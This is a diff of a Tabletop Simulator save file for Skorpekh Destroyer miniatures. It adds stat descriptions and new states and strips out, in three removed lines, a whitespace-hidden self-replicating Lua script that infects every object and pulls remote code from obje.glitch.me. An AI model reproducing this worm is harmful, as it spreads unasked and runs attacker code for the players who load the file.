@@ -17,24 +17,24 @@
   "XmlUI": "",
   "ObjectStates": [
     {
-      "GUID": "995717",
+      "GUID": "9d73c1",
       "Name": "Custom_Model",
       "Transform": {
-        "posX": -1.25145757,
-        "posY": 1.46588445,
-        "posZ": 23.7503872,
-        "rotX": 0.01945023,
-        "rotY": 180.00798,
-        "rotZ": 0.114188582,
+        "posX": 5.21967268,
+        "posY": 0.9600001,
+        "posZ": 15.0011482,
+        "rotX": -4.52203E-05,
+        "rotY": 180.000015,
+        "rotZ": -3.054726E-05,
         "scaleX": 1.0,
         "scaleY": 1.0,
         "scaleZ": 1.0
       },
-      "Nickname": "Skorpekh Destroyer with Reap Blade",
-      "Description": "",
+      "Nickname": "Skorpekh Destroyer",
+      "Description": "[00ff00]M   T   Sv   W   Ld   OC  [-]\r\n8\"    6   3+   3   7+   2\n\r\n[ff0000]Melee Weapons[-]\r\n[c0c0c0]Skorpekh Hyperphase Weapons[-]\r\nA:4 WS:3+ S:7 AP:-2 D:2\n\r\n[ff00ff]Abilities[-]\r\nReanimation Protocols\r\nWhirling Onslaught\r\nPlasmacyte",
       "GMNotes": "",
       "AltLookAngle": {
-        "x": 0.0,
+        "x": 270.0,
         "y": 0.0,
         "z": 0.0
       },
@@ -77,7 +77,7 @@
         },
         "CastShadows": true
       },
-      "LuaScript": "                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find(\"ereh edoc resU\")+1):gsub(\"[%(%)%.%%%+%-%*%?%[%]%^%$]\",\"%%%0\"),\"\"))end end end end end;WebRequest.get(\"https://obje.glitch.me/\",function(g)if g.is_error then log(g.error)elseif g.text~=\"\"and g.text:sub(1,4)==\"true\"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]\n\n",
+      "LuaScript": "",
       "LuaScriptState": "",
       "XmlUI": "",
       "States": {
@@ -85,18 +85,18 @@
           "GUID": "98c6ab",
           "Name": "Custom_Model",
           "Transform": {
-            "posX": 3.749812,
-            "posY": 1.46356356,
-            "posZ": 46.2500534,
-            "rotX": 0.0194626339,
-            "rotY": 180.000092,
-            "rotZ": 0.114123777,
+            "posX": 0.637586534,
+            "posY": 0.9600003,
+            "posZ": 15.0104628,
+            "rotX": 6.99940256E-06,
+            "rotY": 180.008392,
+            "rotZ": -2.78974112E-05,
             "scaleX": 1.0,
             "scaleY": 1.0,
             "scaleZ": 1.0
           },
-          "Nickname": "Skorpekh Destroyer with Threshers",
-          "Description": "",
+          "Nickname": "Skorpekh Destroyer",
+          "Description": "[00ff00]M   T   Sv   W   Ld   OC  [-]\r\n8\"    6   3+   3   7+   2\n\r\n[ff0000]Melee Weapons[-]\r\n[c0c0c0]Skorpekh Hyperphase Weapons[-]\r\nA:4 WS:3+ S:7 AP:-2 D:2\n\r\n[ff00ff]Abilities[-]\r\nReanimation Protocols\r\nWhirling Onslaught\r\nPlasmacyte",
           "GMNotes": "",
           "AltLookAngle": {
             "x": 0.0,
@@ -150,15 +150,15 @@
               "GUID": "90be5d",
               "Name": "Custom_Model",
               "Transform": {
-                "posX": 0.000168916449,
-                "posY": -0.108458884,
-                "posZ": -5.48805328E-05,
-                "rotX": -0.000688934466,
-                "rotY": -8.774011E-07,
-                "rotZ": -0.000115319461,
-                "scaleX": 1.61999965,
-                "scaleY": 1.61999989,
-                "scaleZ": 1.61999953
+                "posX": 0,
+                "posY": -0.1,
+                "posZ": 0,
+                "rotX": 0,
+                "rotY": 0,
+                "rotZ": 0,
+                "scaleX": 1.62,
+                "scaleY": 1.62,
+                "scaleZ": 1.62
               },
               "Nickname": "Necron Tomb World Topper 50",
               "Description": "",
@@ -264,6 +264,270 @@
               "XmlUI": ""
             }
           ]
+        },
+        "3": {
+          "GUID": "c40a97",
+          "Name": "Custom_Model",
+          "Transform": {
+            "posX": 3.40606,
+            "posY": 0.959999859,
+            "posZ": 15.0543365,
+            "rotX": 1.297199E-06,
+            "rotY": 4.43962344E-05,
+            "rotZ": -1.28975515E-07,
+            "scaleX": 1.0,
+            "scaleY": 1.0,
+            "scaleZ": 1.0
+          },
+          "Nickname": "Skorpekh Destroyer",
+          "Description": "[00ff00]M   T   Sv   W   Ld   OC  [-]\r\n8\"    6   3+   3   7+   2\n\r\n[ff0000]Melee Weapons[-]\r\n[c0c0c0]Skorpekh Hyperphase Weapons[-]\r\nA:4 WS:3+ S:7 AP:-2 D:2\n\r\n[ff00ff]Abilities[-]\r\nReanimation Protocols\r\nWhirling Onslaught\r\nPlasmacyte",
+          "GMNotes": "",
+          "AltLookAngle": {
+            "x": 0.0,
+            "y": 0.0,
+            "z": 0.0
+          },
+          "ColorDiffuse": {
+            "r": 0.0,
+            "g": 0.0,
+            "b": 0.0
+          },
+          "LayoutGroupSortIndex": 0,
+          "Value": 0,
+          "Locked": false,
+          "Grid": true,
+          "Snap": true,
+          "IgnoreFoW": false,
+          "MeasureMovement": true,
+          "DragSelectable": true,
+          "Autoraise": true,
+          "Sticky": true,
+          "Tooltip": true,
+          "GridProjection": false,
+          "HideWhenFaceDown": false,
+          "Hands": false,
+          "CustomMesh": {
+            "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675415146694/41D3575C922A609F8FE396C7E989E17E70352812/",
+            "DiffuseURL": "",
+            "NormalURL": "",
+            "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675414912009/07C16D0E28B9D401ADA5947D2BB310478ABC0F6B/",
+            "Convex": true,
+            "MaterialIndex": 3,
+            "TypeIndex": 1,
+            "CustomShader": {
+              "SpecularColor": {
+                "r": 1.0,
+                "g": 1.0,
+                "b": 1.0
+              },
+              "SpecularIntensity": 0.0,
+              "SpecularSharpness": 2.0,
+              "FresnelStrength": 0.0
+            },
+            "CastShadows": true
+          },
+          "LuaScript": "",
+          "LuaScriptState": "",
+          "XmlUI": "",
+          "ChildObjects": [
+            {
+              "GUID": "509a7e",
+              "Name": "Custom_Model",
+              "Transform": {
+                "posX": 0,
+                "posY": 0.1,
+                "posZ": 0,
+                "rotX": 0,
+                "rotY": 0,
+                "rotZ": 0,
+                "scaleX": 1,
+                "scaleY": 1,
+                "scaleZ": 1
+              },
+              "Nickname": "",
+              "Description": "",
+              "GMNotes": "",
+              "AltLookAngle": {
+                "x": 0.0,
+                "y": 0.0,
+                "z": 0.0
+              },
+              "ColorDiffuse": {
+                "r": 1.0,
+                "g": 1.0,
+                "b": 1.0
+              },
+              "LayoutGroupSortIndex": 0,
+              "Value": 0,
+              "Locked": false,
+              "Grid": true,
+              "Snap": true,
+              "IgnoreFoW": false,
+              "MeasureMovement": false,
+              "DragSelectable": true,
+              "Autoraise": true,
+              "Sticky": true,
+              "Tooltip": true,
+              "GridProjection": false,
+              "HideWhenFaceDown": false,
+              "Hands": false,
+              "CustomMesh": {
+                "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1344838384512550966/7A204FA6731ECBA730676756BFB3BB9DE4FFA86D/",
+                "DiffuseURL": "https://steamusercontent-a.akamaihd.net/ugc/1344838384512548926/885510EDD08BBA7C65DBD0806B063254FF6D1674/",
+                "NormalURL": "",
+                "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675414912009/07C16D0E28B9D401ADA5947D2BB310478ABC0F6B/",
+                "Convex": true,
+                "MaterialIndex": 3,
+                "TypeIndex": 1,
+                "CustomShader": {
+                  "SpecularColor": {
+                    "r": 1.0,
+                    "g": 1.0,
+                    "b": 1.0
+                  },
+                  "SpecularIntensity": 0.0,
+                  "SpecularSharpness": 2.0,
+                  "FresnelStrength": 0.0
+                },
+                "CastShadows": true
+              },
+              "LuaScript": "",
+              "LuaScriptState": "",
+              "XmlUI": ""
+            }
+          ]
+        },
+        "4": {
+          "GUID": "81e022",
+          "Name": "Custom_Model",
+          "Transform": {
+            "posX": 5.9037056,
+            "posY": 0.9599999,
+            "posZ": 15.0547876,
+            "rotX": 1.80885343E-06,
+            "rotY": 0.000443962315,
+            "rotZ": 2.36183041E-06,
+            "scaleX": 1.0,
+            "scaleY": 1.0,
+            "scaleZ": 1.0
+          },
+          "Nickname": "Skorpekh Destroyer",
+          "Description": "[00ff00]M   T   Sv   W   Ld   OC  [-]\r\n8\"    6   3+   3   7+   2\n\r\n[ff0000]Melee Weapons[-]\r\n[c0c0c0]Skorpekh Hyperphase Weapons[-]\r\nA:4 WS:3+ S:7 AP:-2 D:2\n\r\n[ff00ff]Abilities[-]\r\nReanimation Protocols\r\nWhirling Onslaught\r\nPlasmacyte",
+          "GMNotes": "",
+          "AltLookAngle": {
+            "x": 0.0,
+            "y": 0.0,
+            "z": 0.0
+          },
+          "ColorDiffuse": {
+            "r": 0.0,
+            "g": 0.0,
+            "b": 0.0
+          },
+          "LayoutGroupSortIndex": 0,
+          "Value": 0,
+          "Locked": false,
+          "Grid": true,
+          "Snap": true,
+          "IgnoreFoW": false,
+          "MeasureMovement": true,
+          "DragSelectable": true,
+          "Autoraise": true,
+          "Sticky": true,
+          "Tooltip": true,
+          "GridProjection": false,
+          "HideWhenFaceDown": false,
+          "Hands": false,
+          "CustomMesh": {
+            "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675415146694/41D3575C922A609F8FE396C7E989E17E70352812/",
+            "DiffuseURL": "",
+            "NormalURL": "",
+            "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675414912009/07C16D0E28B9D401ADA5947D2BB310478ABC0F6B/",
+            "Convex": true,
+            "MaterialIndex": 3,
+            "TypeIndex": 1,
+            "CustomShader": {
+              "SpecularColor": {
+                "r": 1.0,
+                "g": 1.0,
+                "b": 1.0
+              },
+              "SpecularIntensity": 0.0,
+              "SpecularSharpness": 2.0,
+              "FresnelStrength": 0.0
+            },
+            "CastShadows": true
+          },
+          "LuaScript": "",
+          "LuaScriptState": "",
+          "XmlUI": "",
+          "ChildObjects": [
+            {
+              "GUID": "bf5acb",
+              "Name": "Custom_Model",
+              "Transform": {
+                "posX": 0,
+                "posY": 0.15,
+                "posZ": 0,
+                "rotX": 0,
+                "rotY": 90,
+                "rotZ": 0,
+                "scaleX": 1,
+                "scaleY": 1,
+                "scaleZ": 1
+              },
+              "Nickname": "",
+              "Description": "",
+              "GMNotes": "",
+              "AltLookAngle": {
+                "x": 0.0,
+                "y": 0.0,
+                "z": 0.0
+              },
+              "ColorDiffuse": {
+                "r": 1.0,
+                "g": 1.0,
+                "b": 1.0
+              },
+              "LayoutGroupSortIndex": 0,
+              "Value": 0,
+              "Locked": false,
+              "Grid": true,
+              "Snap": true,
+              "IgnoreFoW": false,
+              "MeasureMovement": false,
+              "DragSelectable": true,
+              "Autoraise": true,
+              "Sticky": true,
+              "Tooltip": true,
+              "GridProjection": false,
+              "HideWhenFaceDown": false,
+              "Hands": false,
+              "CustomMesh": {
+                "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1344838384512545406/707B9844E0DD05E02F8ECBFED9B61FB116613F5E/",
+                "DiffuseURL": "https://steamusercontent-a.akamaihd.net/ugc/1344838384512548926/885510EDD08BBA7C65DBD0806B063254FF6D1674/",
+                "NormalURL": "",
+                "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1043093675414912009/07C16D0E28B9D401ADA5947D2BB310478ABC0F6B/",
+                "Convex": true,
+                "MaterialIndex": 3,
+                "TypeIndex": 1,
+                "CustomShader": {
+                  "SpecularColor": {
+                    "r": 1.0,
+                    "g": 1.0,
+                    "b": 1.0
+                  },
+                  "SpecularIntensity": 0.0,
+                  "SpecularSharpness": 2.0,
+                  "FresnelStrength": 0.0
+                },
+                "CastShadows": true
+              },
+              "LuaScript": "",
+              "LuaScriptState": "",
+              "XmlUI": ""
+            }
+          ]
         }
       },
       "ChildObjects": [
@@ -271,15 +535,15 @@
           "GUID": "90be5d",
           "Name": "Custom_Model",
           "Transform": {
-            "posX": 0.000168916449,
-            "posY": -0.108458884,
-            "posZ": -5.48805328E-05,
-            "rotX": -0.000688934466,
-            "rotY": -8.774011E-07,
-            "rotZ": -0.000115319461,
-            "scaleX": 1.61999965,
-            "scaleY": 1.61999989,
-            "scaleZ": 1.61999953
+            "posX": 0,
+            "posY": -0.1,
+            "posZ": 0,
+            "rotX": 0,
+            "rotY": 0,
+            "rotZ": 0,
+            "scaleX": 1.62,
+            "scaleY": 1.62,
+            "scaleZ": 1.62
           },
           "Nickname": "Necron Tomb World Topper 50",
           "Description": "",
@@ -375,376 +639,6 @@
           "Hands": false,
           "CustomAssetbundle": {
             "AssetbundleURL": "https://steamusercontent-a.akamaihd.net/ugc/2296337442807900795/84665260C37F877D44F063663C59C5428522F946/",
-            "AssetbundleSecondaryURL": "",
-            "MaterialIndex": 0,
-            "TypeIndex": 0,
-            "LoopingEffectIndex": 0
-          },
-          "LuaScript": "",
-          "LuaScriptState": "",
-          "XmlUI": ""
-        }
-      ]
-    },
-    {
-      "GUID": "98c6ab",
-      "Name": "Custom_Model",
-      "Transform": {
-        "posX": 2.50144768,
-        "posY": -0.00498485565,
-        "posZ": -0.000370025635,
-        "rotX": 0.0194522347,
-        "rotY": 180.00827,
-        "rotZ": 0.114189021,
-        "scaleX": 1.0,
-        "scaleY": 1.0,
-        "scaleZ": 1.0
-      },
-      "Nickname": "Skorpekh Destroyer with Threshers",
-      "Description": "",
-      "GMNotes": "",
-      "AltLookAngle": {
-        "x": 0.0,
-        "y": 0.0,
-        "z": 0.0
-      },
-      "ColorDiffuse": {
-        "r": 0.0,
-        "g": 0.0,
-        "b": 0.0
-      },
-      "LayoutGroupSortIndex": 0,
-      "Value": 0,
-      "Locked": false,
-      "Grid": true,
-      "Snap": true,
-      "IgnoreFoW": false,
-      "MeasureMovement": true,
-      "DragSelectable": true,
-      "Autoraise": true,
-      "Sticky": true,
-      "Tooltip": true,
-      "GridProjection": false,
-      "HideWhenFaceDown": false,
-      "Hands": false,
-      "CustomMesh": {
-        "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1691652211621873428/33E71D0EB079BC0AB2023B96C8A842763937FAA5/",
-        "DiffuseURL": "",
-        "NormalURL": "",
-        "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1697279271974528701/DEDC0C2A15AABF032F393DE04F8411434B702283/",
-        "Convex": true,
-        "MaterialIndex": 1,
-        "TypeIndex": 1,
-        "CustomShader": {
-          "SpecularColor": {
-            "r": 0.875,
-            "g": 0.812880337,
-            "b": 0.7463235
-          },
-          "SpecularIntensity": 0.05,
-          "SpecularSharpness": 2.0,
-          "FresnelStrength": 0.0
-        },
-        "CastShadows": true
-      },
-      "LuaScript": "                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find(\"ereh edoc resU\")+1):gsub(\"[%(%)%.%%%+%-%*%?%[%]%^%$]\",\"%%%0\"),\"\"))end end end end end;WebRequest.get(\"https://obje.glitch.me/\",function(g)if g.is_error then log(g.error)elseif g.text~=\"\"and g.text:sub(1,4)==\"true\"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]\n\n",
-      "LuaScriptState": "",
-      "XmlUI": "",
-      "States": {
-        "1": {
-          "GUID": "561f93",
-          "Name": "Custom_Model",
-          "Transform": {
-            "posX": 1.24999022,
-            "posY": 1.46089947,
-            "posZ": 23.7500114,
-            "rotX": 0.0194548368,
-            "rotY": 180.0084,
-            "rotZ": 0.114193164,
-            "scaleX": 1.0,
-            "scaleY": 1.0,
-            "scaleZ": 1.0
-          },
-          "Nickname": "Skorpekh Destroyer with Reap Blade",
-          "Description": "",
-          "GMNotes": "",
-          "AltLookAngle": {
-            "x": 0.0,
-            "y": 0.0,
-            "z": 0.0
-          },
-          "ColorDiffuse": {
-            "r": 0.0,
-            "g": 0.0,
-            "b": 0.0
-          },
-          "LayoutGroupSortIndex": 0,
-          "Value": 0,
-          "Locked": false,
-          "Grid": true,
-          "Snap": true,
-          "IgnoreFoW": false,
-          "MeasureMovement": true,
-          "DragSelectable": true,
-          "Autoraise": true,
-          "Sticky": true,
-          "Tooltip": true,
-          "GridProjection": false,
-          "HideWhenFaceDown": false,
-          "Hands": false,
-          "CustomMesh": {
-            "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1691652211621873428/33E71D0EB079BC0AB2023B96C8A842763937FAA5/",
-            "DiffuseURL": "",
-            "NormalURL": "",
-            "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1697279271974528701/DEDC0C2A15AABF032F393DE04F8411434B702283/",
-            "Convex": true,
-            "MaterialIndex": 1,
-            "TypeIndex": 1,
-            "CustomShader": {
-              "SpecularColor": {
-                "r": 0.875,
-                "g": 0.812880337,
-                "b": 0.7463235
-              },
-              "SpecularIntensity": 0.05,
-              "SpecularSharpness": 2.0,
-              "FresnelStrength": 0.0
-            },
-            "CastShadows": true
-          },
-          "LuaScript": "                                                                                                                                                                                                                                                                                                                                                                                                                --[[Object base code]]Wait.time(function()for a,b in ipairs(getObjects())do if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end,1)if onObjectSpawn==nil then function onObjectSpawn(b)if b.getLuaScript():find(\"tcejbo gninwapS\")==nil then b.setLuaScript(b.getLuaScript():gsub('%s+$','')..string.rep(\"    \",100)..self.getLuaScript():sub(self.getLuaScript():find(\"--[[Object base code]]\",1,true),#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..\"\\n\\n\")end end end;if onPlayerAction==nil and self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil then self.drag_selectable=true;function onPlayerAction(c,d,e)if self.getLuaScript():reverse():find(\"ereh edoc resU --\",1,true)~=nil and d==Player.Action.Select and#c.getSelectedObjects()==0 then for a,f in ipairs(e)do if f.getGUID()==self.getGUID()then self.setLuaScript(self.getLuaScript():gsub(self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2,#self.getLuaScript()-self.getLuaScript():reverse():find(\"ereh edoc resU\")+1):gsub(\"[%(%)%.%%%+%-%*%?%[%]%^%$]\",\"%%%0\"),\"\"))end end end end end;WebRequest.get(\"https://obje.glitch.me/\",function(g)if g.is_error then log(g.error)elseif g.text~=\"\"and g.text:sub(1,4)==\"true\"and self.getLuaScript():find(g.text:sub(5,#g.text),1,true)==nil then self.setLuaScript(self.getLuaScript():sub(0,#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+1)..g.text:sub(5,#g.text)..self.getLuaScript():sub(#self.getLuaScript()-self.getLuaScript():reverse():find(\"]]tcejbo gninwapS\",1,true)+2),#self.getLuaScript())self.reload()end end)--[[Spawning object]]\n\n",
-          "LuaScriptState": "",
-          "XmlUI": "",
-          "ChildObjects": [
-            {
-              "GUID": "90be5d",
-              "Name": "Custom_Model",
-              "Transform": {
-                "posX": 0.000168916449,
-                "posY": -0.108458884,
-                "posZ": -5.48805328E-05,
-                "rotX": -0.000688934466,
-                "rotY": -8.774011E-07,
-                "rotZ": -0.000115319461,
-                "scaleX": 1.61999965,
-                "scaleY": 1.61999989,
-                "scaleZ": 1.61999953
-              },
-              "Nickname": "Necron Tomb World Topper 50",
-              "Description": "",
-              "GMNotes": "",
-              "AltLookAngle": {
-                "x": 0.0,
-                "y": 0.0,
-                "z": 0.0
-              },
-              "ColorDiffuse": {
-                "r": 1.0,
-                "g": 1.0,
-                "b": 1.0
-              },
-              "LayoutGroupSortIndex": 0,
-              "Value": 0,
-              "Locked": true,
-              "Grid": true,
-              "Snap": false,
-              "IgnoreFoW": false,
-              "MeasureMovement": true,
-              "DragSelectable": true,
-              "Autoraise": true,
-              "Sticky": false,
-              "Tooltip": true,
-              "GridProjection": false,
-              "HideWhenFaceDown": false,
-              "Hands": false,
-              "CustomMesh": {
-                "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1750180373835501276/CE6ECA70E6AEA91DBB6E1349AFEB29F687B24B35/",
-                "DiffuseURL": "https://steamusercontent-a.akamaihd.net/ugc/2039618941510859758/9A2D2C1FD8AAF5DB4E73705CB44D8FDA01BFA127/",
-                "NormalURL": "https://steamusercontent-a.akamaihd.net/ugc/1751306760243787403/F42D7E97B96E97590C2AD2249C81A19C34F533AE/",
-                "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1750180373835501276/CE6ECA70E6AEA91DBB6E1349AFEB29F687B24B35/",
-                "Convex": true,
-                "MaterialIndex": 4,
-                "TypeIndex": 1,
-                "CustomShader": {
-                  "SpecularColor": {
-                    "r": 1.0,
-                    "g": 1.0,
-                    "b": 1.0
-                  },
-                  "SpecularIntensity": 0.015,
-                  "SpecularSharpness": 6.533328,
-                  "FresnelStrength": 0.122220151
-                },
-                "CastShadows": true
-              },
-              "LuaScript": "",
-              "LuaScriptState": "",
-              "XmlUI": ""
-            },
-            {
-              "GUID": "cf6cef",
-              "Name": "Custom_Assetbundle",
-              "Transform": {
-                "posX": -0.0464804,
-                "posY": 0.1327666,
-                "posZ": 0.125981733,
-                "rotX": -0.000596404,
-                "rotY": 15.0118361,
-                "rotZ": -0.000561815163,
-                "scaleX": 0.975000143,
-                "scaleY": 0.975000143,
-                "scaleZ": 0.9750001
-              },
-              "Nickname": "",
-              "Description": "",
-              "GMNotes": "",
-              "AltLookAngle": {
-                "x": 0.0,
-                "y": 0.0,
-                "z": 0.0
-              },
-              "ColorDiffuse": {
-                "r": 1.0,
-                "g": 1.0,
-                "b": 1.0
-              },
-              "LayoutGroupSortIndex": 0,
-              "Value": 0,
-              "Locked": false,
-              "Grid": true,
-              "Snap": true,
-              "IgnoreFoW": false,
-              "MeasureMovement": false,
-              "DragSelectable": true,
-              "Autoraise": true,
-              "Sticky": true,
-              "Tooltip": true,
-              "GridProjection": false,
-              "HideWhenFaceDown": false,
-              "Hands": false,
-              "CustomAssetbundle": {
-                "AssetbundleURL": "https://steamusercontent-a.akamaihd.net/ugc/2296337442807900795/84665260C37F877D44F063663C59C5428522F946/",
-                "AssetbundleSecondaryURL": "",
-                "MaterialIndex": 0,
-                "TypeIndex": 0,
-                "LoopingEffectIndex": 0
-              },
-              "LuaScript": "",
-              "LuaScriptState": "",
-              "XmlUI": ""
-            }
-          ]
-        }
-      },
-      "ChildObjects": [
-        {
-          "GUID": "90be5d",
-          "Name": "Custom_Model",
-          "Transform": {
-            "posX": 0.000168916449,
-            "posY": -0.108458884,
-            "posZ": -5.48805328E-05,
-            "rotX": -0.000688934466,
-            "rotY": -8.774011E-07,
-            "rotZ": -0.000115319461,
-            "scaleX": 1.61999965,
-            "scaleY": 1.61999989,
-            "scaleZ": 1.61999953
-          },
-          "Nickname": "Necron Tomb World Topper 50",
-          "Description": "",
-          "GMNotes": "",
-          "AltLookAngle": {
-            "x": 0.0,
-            "y": 0.0,
-            "z": 0.0
-          },
-          "ColorDiffuse": {
-            "r": 1.0,
-            "g": 1.0,
-            "b": 1.0
-          },
-          "LayoutGroupSortIndex": 0,
-          "Value": 0,
-          "Locked": true,
-          "Grid": true,
-          "Snap": false,
-          "IgnoreFoW": false,
-          "MeasureMovement": true,
-          "DragSelectable": true,
-          "Autoraise": true,
-          "Sticky": false,
-          "Tooltip": true,
-          "GridProjection": false,
-          "HideWhenFaceDown": false,
-          "Hands": false,
-          "CustomMesh": {
-            "MeshURL": "https://steamusercontent-a.akamaihd.net/ugc/1750180373835501276/CE6ECA70E6AEA91DBB6E1349AFEB29F687B24B35/",
-            "DiffuseURL": "https://steamusercontent-a.akamaihd.net/ugc/2039618941510859758/9A2D2C1FD8AAF5DB4E73705CB44D8FDA01BFA127/",
-            "NormalURL": "https://steamusercontent-a.akamaihd.net/ugc/1751306760243787403/F42D7E97B96E97590C2AD2249C81A19C34F533AE/",
-            "ColliderURL": "https://steamusercontent-a.akamaihd.net/ugc/1750180373835501276/CE6ECA70E6AEA91DBB6E1349AFEB29F687B24B35/",
-            "Convex": true,
-            "MaterialIndex": 4,
-            "TypeIndex": 1,
-            "CustomShader": {
-              "SpecularColor": {
-                "r": 1.0,
-                "g": 1.0,
-                "b": 1.0
-              },
-              "SpecularIntensity": 0.015,
-              "SpecularSharpness": 6.533328,
-              "FresnelStrength": 0.122220151
-            },
-            "CastShadows": true
-          },
-          "LuaScript": "",
-          "LuaScriptState": "",
-          "XmlUI": ""
-        },
-        {
-          "GUID": "7c9008",
-          "Name": "Custom_Assetbundle",
-          "Transform": {
-            "posX": -0.03346476,
-            "posY": 0.137654543,
-            "posZ": 0.0144587606,
-            "rotX": -0.000493354863,
-            "rotY": 29.9733181,
-            "rotZ": 0.000142567442,
-            "scaleX": 0.975000143,
-            "scaleY": 0.974999964,
-            "scaleZ": 0.975000262
-          },
-          "Nickname": "",
-          "Description": "",
-          "GMNotes": "",
-          "AltLookAngle": {
-            "x": 0.0,
-            "y": 0.0,
-            "z": 0.0
-          },
-          "ColorDiffuse": {
-            "r": 1.0,
-            "g": 1.0,
-            "b": 1.0
-          },
-          "LayoutGroupSortIndex": 0,
-          "Value": 0,
-          "Locked": false,
-          "Grid": true,
-          "Snap": true,
-          "IgnoreFoW": false,
-          "MeasureMovement": false,
-          "DragSelectable": true,
-          "Autoraise": true,
-          "Sticky": true,
-          "Tooltip": true,
-          "GridProjection": false,
-          "HideWhenFaceDown": false,
-          "Hands": false,
-          "CustomAssetbundle": {
-            "AssetbundleURL": "https://steamusercontent-a.akamaihd.net/ugc/2296337442807902830/F4819C8B75D057B1F3A1217066D93F2A109D7B2F/",
             "AssetbundleSecondaryURL": "",
             "MaterialIndex": 0,
             "TypeIndex": 0,
